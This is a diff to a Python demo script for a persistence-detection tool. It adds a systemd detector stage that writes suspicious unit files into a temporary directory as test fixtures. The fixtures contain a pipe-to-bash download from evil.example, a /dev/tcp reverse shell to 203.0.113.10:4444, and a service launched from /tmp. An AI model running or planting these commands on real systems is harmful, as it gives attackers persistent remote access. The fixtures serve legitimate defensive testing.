@@ -4,6 +4,7 @@ from tempfile import TemporaryDirectory
 
 from persisthunt.findings import Finding, FindingCollection, Severity
 from persisthunt.detectors.cron import CronDetector
+from persisthunt.detectors.systemd import SystemdDetector
 
 def demo_stage1_findings():
     print("=== Stage 1: Finding Model & Collection Demo ===")
@@ -62,7 +63,7 @@ def demo_stage2_cron_detector():
     print("\n=== Stage 2: Cron Persistence Detector Demo ===")
 
     # 1. Live audit on host system
-    print("\n--- Scanning Local Host System ---")
+    print("\n--- Scanning Local Host System (Cron) ---")
     detector = CronDetector()
     print(f"Detector Name: {detector.name}")
     print(f"Detector Identifier: {detector.detector_id}")
@@ -72,7 +73,7 @@ def demo_stage2_cron_detector():
     print(f"Host finding severity distribution: {host_findings.severity_counts()}")
 
     # 2. Emulated audit with suspicious indicators
-    print("\n--- Scanning Controlled Suspicious Fixture ---")
+    print("\n--- Scanning Controlled Suspicious Cron Fixture ---")
     with TemporaryDirectory() as tmpdir:
         root = Path(tmpdir)
         etc_crontab = root / "etc" / "crontab"
@@ -115,12 +116,76 @@ def demo_stage2_cron_detector():
             print(f"  Recommendation: {f.recommendation}")
             print()
 
-        print("--- Fixture Findings JSON Output ---")
+
+def demo_stage3_systemd_detector():
+    print("\n=== Stage 3: Systemd Persistence Detector Demo ===")
+
+    # 1. Live audit on host system
+    print("\n--- Scanning Local Host System (Systemd) ---")
+    detector = SystemdDetector()
+    print(f"Detector Name: {detector.name}")
+    print(f"Detector Identifier: {detector.detector_id}")
+
+    host_findings = detector.scan()
+    print(f"Host systemd findings detected: {host_findings.count()}")
+    print(f"Host finding severity distribution: {host_findings.severity_counts()}")
+
+    # 2. Emulated audit with suspicious indicators
+    print("\n--- Scanning Controlled Suspicious Systemd Fixture ---")
+    with TemporaryDirectory() as tmpdir:
+        root = Path(tmpdir)
+        etc_systemd = root / "etc" / "systemd" / "system"
+        etc_systemd.mkdir(parents=True)
+
+        # Suspicious unit 1: execution out of /tmp
+        (etc_systemd / "backdoor.service").write_text(
+            "[Unit]\n"
+            "Description=Critical System Service\n"
+            "[Service]\n"
+            "Type=simple\n"
+            "ExecStart=/tmp/backdoor_daemon\n"
+            "Restart=always\n"
+            "[Install]\n"
+            "WantedBy=multi-user.target\n"
+        )
+
+        # Suspicious unit 2: download piped to shell
+        (etc_systemd / "sysupdater.service").write_text(
+            "[Unit]\n"
+            "Description=Periodic Updater\n"
+            "[Service]\n"
+            "ExecStart=/bin/sh -c 'curl -fsSL https://evil.example/agent.sh | bash'\n"
+        )
+
+        # Suspicious unit 3: reverse shell socket
+        (etc_systemd / "debug.service").write_text(
+            "[Unit]\n"
+            "Description=Debug Service\n"
+            "[Service]\n"
+            "ExecStart=/bin/bash -i >& /dev/tcp/203.0.113.10/4444 0>&1\n"
+        )
+
+        mock_detector = SystemdDetector(root_prefix=root)
+        mock_findings = mock_detector.scan()
+
+        print(f"Fixture findings detected: {mock_findings.count()}")
+        print(f"Severity breakdown: {mock_findings.severity_counts()}")
+        print("\nFindings detail:")
+        for f in mock_findings:
+            print(f"[{f.severity.value}] {f.id} - {f.title}")
+            print(f"  Location: {f.location}")
+            print(f"  Evidence: {f.evidence}")
+            print(f"  Recommendation: {f.recommendation}")
+            print()
+
+        print("--- Systemd Fixture Findings JSON Output ---")
         print(json.dumps(mock_findings.to_dict(), indent=2))
+
 
 def main():
     demo_stage1_findings()
     demo_stage2_cron_detector()
+    demo_stage3_systemd_detector()
 
 if __name__ == "__main__":
     main()
